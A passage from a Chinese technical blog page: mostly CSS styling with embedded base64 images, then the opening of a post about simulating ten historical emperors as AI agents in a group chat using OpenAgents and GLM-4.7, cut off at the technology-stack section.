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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是LucianaiB。</p>
<h2 data-id="heading-0">历史十大帝王拉到一个群聊会发生什么事？朱元璋直接开喷</h2>
<p>话不多说，直接看效果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dd5cac78ea8419cb8770518dac5d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RBaNJLazsLH7DTJPW4krNaF5000%3D" alt="img" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5de07aaab49e99b94b1a70d57403d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ae8cQ6kWC%2F6L7VUZNKlgg81QkSo%3D" alt="img" loading="lazy"/></p>
<p>本项目已开源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOnePieceLwc%2FOpenAgents-GLM" target="_blank" title="https://github.com/OnePieceLwc/OpenAgents-GLM" ref="nofollow noopener noreferrer">github.com/OnePieceLwc…</a></p>
<h2 data-id="heading-1">引言：从短剧灵感到AI实验</h2>
<p>最近沉迷于在某果看爽文短剧，入局就是《<strong>我的视频通万朝：开局盘点十大帝王</strong>》，AI发展的现在，AI短剧越来越得到更多的支持，（小道消息：明年某音会对AI短剧加搞得的支持）,看完短剧之后就是盘点十大帝王，给排了一个排行榜，但是他们直接没有发生有趣的故事，既然作为一个程序员，不能留下这个遗憾，我就想作者创造排行榜，那么<strong>我把《十大帝王拉到一个群聊》一起给我干活讨论，一起讨论事情，会发生什么有趣的事呢？</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35153e97d9aa4c58aaab35cdaaaf2d64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=mCAPNKO%2F8JCXhgZtytAiZ55OrZo%3D" alt="img" loading="lazy"/></p>
<h2 data-id="heading-2">相关技术栈</h2>
<p>简单来说就是，本次采用的是OpenAgents搭建一个<strong>网络中心（群聊）</strong>，搭建多个<strong>智能体**</strong>（帝王），**用GLM - 4.7给这些给赋予灵魂。</p>
<h3 data-id="heading-3">OpenAgents</h3>
